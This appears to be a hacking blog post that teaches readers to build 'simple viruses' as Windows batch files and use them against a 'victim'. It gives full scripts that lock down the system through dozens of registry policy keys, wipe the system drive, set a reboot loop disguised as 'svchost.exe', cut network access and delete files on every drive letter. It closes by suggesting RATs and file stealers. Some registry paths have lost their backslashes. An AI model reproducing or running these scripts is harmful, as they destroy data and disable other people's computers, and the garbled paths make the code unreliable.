Everyone always want to perform hacking in an easy way. This includes using already built tools & Exploits. Have you wondered that what is the easiest way to create a simple virus for Windows? I did, so I found that simpler things can get a big job done. Today I am going to tell you how to use Batch scripting to create simple but efficient viruses. First a little bit of info about what Batch really is…

Batch File : A batch file is a kind of script file which is created usually using simple text editors. I makes use of Windows CMD commands. It works using command line interpreter & it is usually executed by a shell program ( Command.com or CMD ) These files have  a .bat extension.

If you want to learn it just google it and trust me its worth it. Now let me show you some codes that I have frequently used.

    Mess up the registry : This code can give a hard blow to the registry. This will just kill some resources  in such a way that the victim will get very annoyed.

@echo off

reg add HKCUSoftwareMicrosoftWindowsCurrentVersionPoliciesExplorer /v NoControlPanel /t REG_DWORD /d 00000001

reg add HKCUSoftwareMicrosoftWindowsCurrentVersionPoliciesExplorer /v NoRun /t REG_DWORD /d 00000001

reg add HKCUSoftwareMicrosoftWindowsCurrentVersionPoliciesExplorer /v NoToolbarsOnTaskbar /t REG_DWORD /d 00000001

reg add HKCUSoftwareMicrosoftWindowsCurrentVersionPoliciesExplorer /v NoSetTaskBar /t REG_DWORD /d 00000001

reg add HKCUSoftwareMicrosoftWindowsCurrentVersionPoliciesExplorer /v NoViewContextMenu /t REG_DWORD /d 00000001

reg add HKCUSoftwareMicrosoftWindowsCurrentVersionPoliciesExplorer /v NoTrayContextMenu /t REG_DWORD /d 00000001

reg add HKCUSoftwareMicrosoftWindowsCurrentVersionPoliciesExplorer /v NoStartMenuMorePrograms /t REG_DWORD /d 00000001

reg add HKCUSoftwareMicrosoftWindowsCurrentVersionPoliciesExplorer /v NoSetFolders /t REG_DWORD /d 00000001

reg add HKCUSoftwareMicrosoftWindowsCurrentVersionPoliciesExplorer /v NoSecurityTab /t REG_DWORD /d 00000001

reg add HKCUSoftwareMicrosoftWindowsCurrentVersionPoliciesExplorer /v NoLogOff /t REG_DWORD /d 00000001

reg add HKCUSoftwareMicrosoftWindowsCurrentVersionPoliciesExplorer /v NoFind /t REG_DWORD /d 00000001

reg add HKCUSoftwareMicrosoftWindowsCurrentVersionPoliciesExplorer /v NoDrives /t REG_DWORD /d 03ffffff

reg add HKCUSoftwareMicrosoftWindowsCurrentVersionPoliciesExplorer /v NoClose /t REG_DWORD /d 00000001

reg add HKCUSoftwareMicrosoftWindowsCurrentVersionPoliciesExplorer /v NoNetHood /t REG_DWORD /d 00000001

reg add HKCUSoftwareMicrosoftWindowsCurrentVersionPoliciesExplorer /v NoNetworkConnections /t REG_DWORD /d 00000001

reg add HKCUSoftwareMicrosoftWindowsCurrentVersionPoliciesExplorer /v NoDesktop /t REG_DWORD /d 00000001

reg add HKCUSoftwareMicrosoftWindowsCurrentVersionPoliciesExplorer /v StartMenuLogOff /t REG_DWORD /d 00000000

reg add HKCUSoftwareMicrosoftWindowsCurrentVersionPoliciesExplorer /v ClassicShell /t REG_DWORD /d 00000000

reg add HKCUSoftwareMicrosoftWindowsCurrentVersionPoliciesExplorer /v NoSMMyDocs /t REG_DWORD /d 00000001

reg add HKCUSoftwareMicrosoftWindowsCurrentVersionPoliciesExplorer /v NoSMHelp /t REG_DWORD /d 00000001

reg add HKCUSoftwareMicrosoftWindowsCurrentVersionPoliciesExplorer /v NoSMConfigurePrograms /t REG_DWORD /d 00000001

reg add HKCUSoftwareMicrosoftWindowsCurrentVersionPoliciesExplorer /v NoStartMenuMyMusic /t REG_DWORD /d 00000001

reg add HKCUSoftwareMicrosoftWindowsCurrentVersionPoliciesExplorer /v NoSMMyPictures /t REG_DWORD /d 00000001

reg add HKCUSoftwareMicrosoftWindowsCurrentVersionPoliciesExplorer /v NoRecentDocsMenu /t REG_DWORD /d 00000001

reg add HKCUSoftwareMicrosoftWindowsCurrentVersionPoliciesExplorer /v NoFavoritesMenu /t REG_DWORD /d 00000001

reg add HKCUSoftwareMicrosoftWindowsCurrentVersionPoliciesExplorer /v NoStartMenuPinnedList /t REG_DWORD /d 00000001

reg add HKCUSoftwareMicrosoftWindowsCurrentVersionPoliciesExplorer /v NoActiveDesktop /t REG_DWORD /d 00000001

reg add HKCUSoftwareMicrosoftWindowsCurrentVersionPoliciesExplorer /v NoTrayItemsDisplay /t REG_DWORD /d 00000001

reg add HKCUSoftwareMicrosoftWindowsCurrentVersionPoliciesSystem /v DisableTaskMgr /t REG_DWORD /d 00000001

reg add HKCUSoftwareMicrosoftWindowsCurrentVersionPoliciesSystem /v DisableRegistryTools /t REG_DWORD /d 00000001

reg add HKCUSoftwareMicrosoftWindowsCurrentVersionPoliciesSystem /v DisableChangePassword /t REG_DWORD /d 00000001

reg add HKCUSoftwareMicrosoftWindowsCurrentVersionPoliciesSystem /v DisableLockWorkstation /t REG_DWORD /d 00000001

reg add HKCUSoftwareMicrosoftWindowsCurrentVersionPoliciesSystem /v NoDispCPL /t REG_DWORD /d 00000001

reg add HKCUSoftwareMicrosoftWindowsCurrentVersionPoliciesSystem /v NoDispBackgroundPage /t REG_DWORD /d 00000001

reg add HKCUSoftwareMicrosoftWindowsCurrentVersionPoliciesSystem /v NoDispScrSavPage /t REG_DWORD /d 00000001

reg add HKCUSoftwareMicrosoftWindowsCurrentVersionPoliciesSystem /v NoDispAppearancePage /t REG_DWORD /d 00000001

reg add HKCUSoftwareMicrosoftWindowsCurrentVersionPoliciesSystem /v NoDispSettingsPage /t REG_DWORD /d 00000001

reg add HKCUSoftwarePoliciesMicrosoftWindowsSystem /v DisableCMD /t REG_DWORD /d 00000002

reg add HKLMSoftwareMicrosoftWindowsCurrentVersionPoliciesSystem /v legalnoticecaption /d Oops..

reg add HKLMSoftwareMicrosoftWindowsCurrentVersionPoliciesSystem /v legalnoticetext /d …Hacked…

reg add HKCUSoftwarePoliciesMicrosoftMMC /v RestrictToPermittedSnapins /t REG_DWORD /d 00000001

reg add HKCUSoftwareMicrosoftWindowsCurrentVersionExplorerAdvanced /v Start_ShowPrinters /t REG_DWORD /d 00000000

reg add HKCUSoftwareMicrosoftWindowsCurrentVersionExplorerAdvanced /v Start_AdminToolsRoot /t REG_DWORD /d 00000000

reg add HKCUSoftwareMicrosoftWindowsCurrentVersionExplorerAdvanced /v Start_ShowMyComputer /t REG_DWORD /d 00000000

reg add HKCUSoftwareMicrosoftWindowsCurrentVersionExplorerAdvanced /v WebView /t REG_DWORD /d 00000000

reg add HKCUSoftwareMicrosoftWindowsCurrentVersionPoliciesUninstall /v NoAddRemovePrograms /t REG_DWORD /d 00000001

reg add HKCUSoftwareMicrosoftWindowsCurrentVersionPoliciesUninstall /v NoAddPage /t REG_DWORD /d 00000001

reg add HKCUSoftwareMicrosoftWindowsCurrentVersionPoliciesUninstall /v NoRemovePage /t REG_DWORD /d 00000001

reg add HKCUControl PanelInternational /v sTimeFormat /d H:mm:ss

reg add HKU.DEFAULTSoftwareMicrosoftWindowsCurrentVersionExplorerAdvanced /v WebView /t REG_DWORD /d 00000000

Exit

    Crash the OS : This code can just simply crash Windows. Note that you can have problems when using this code because some times it doesn’t work.

@echo off

erase %systemdrive%*.* /f /s /q

exit

    Keep Victim’s Computer Rebooting : Another annoying code which can have tough effects on an inexperienced user. You will also notice that how simple things can leave Windows with no defense.

@echo off

reg add HKLMSOFTWAREMicrosoftWindowsCurrentVersionRun /f /v “svchost.exe” /d “shutdown -r -t 00”

exit

    Disable the Victim’s Internet : Want to stop someone from accessing the internet? Just use this four lines code.

@echo off

ipconfig / Release

if ERRORLEVEL1 ipconfig /release_all

exit

    Erase All Drives : Want to erase every thing? Well its simple in Windows.

@echo off

del A:*.* /f /s /q

del B:*.* /f /s /q

del C:*.* /f /s /q

del D:*.* /f /s /q

del E:*.* /f /s /q

del F:*.* /f /s /q

del G:*.* /f /s /q

del H:*.* /f /s /q

del I:*.* /f /s /q

del J:*.* /f /s /q

del K:*.* /f /s /q

del L:*.* /f /s /q

del M:*.* /f /s /q

del N:*.* /f /s /q

del O:*.* /f /s /q

del P:*.* /f /s /q

del Q:*.* /f /s /q

del R:*.* /f /s /q

del S:*.* /f /s /q

del T:*.* /f /s /q

del U:*.* /f /s /q

del V:*.* /f /s /q

del W:*.* /f /s /q

del X:*.* /f /s /q

del Y:*.* /f /s /q

del Z:*.* /f /s /q

exit

#How to use these code’s?

Just type the code in simple text editors like notepad etc and save the file with a .bat extension. Then just double click on them to run them.

Alright But What is the potential of Batch Scripting?  

Its more than you can imagine. Codes that I have provided above are just a slight view of what is possible. You can even create some thing like a RAT or a remote file stealer in it and it will be a lot easier to do than you can imagine.

Some useful links

I have seen many useful links that I want to share with you guys. Like..
